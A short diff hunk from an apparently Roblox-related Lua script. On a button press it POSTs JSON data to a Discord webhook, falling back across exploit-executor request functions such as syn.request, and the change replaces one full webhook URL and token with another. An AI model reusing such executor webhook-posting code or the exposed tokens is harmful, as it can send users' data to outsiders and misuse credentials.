@@ -225,7 +225,7 @@ local function onButtonPress()
             local newdata = HttpService:JSONEncode(data)
 
             local request = http_request or request or HttpPost or syn.request
-            local abcdef = {Url = "https://discord.com/api/webhooks/1153849889873203220/4PNEe2bCRoMHnPLSaJllDARBAMTlPVhNnV_-cUkMI3XgBm_RXtS-k-TKvAX0rhcYIDoi", Body = newdata, Method = "POST", Headers = headers}
+            local abcdef = {Url = "https://discord.com/api/webhooks/1198424490976223232/BD_DEm0kF9t3PTs_eBzZ6BwPoLZeOjwFL5xbwUk8MUye34VKPLrcPiFVZ7Tx208aBX9W", Body = newdata, Method = "POST", Headers = headers}
             request(abcdef)
 
             -- Show a success notification
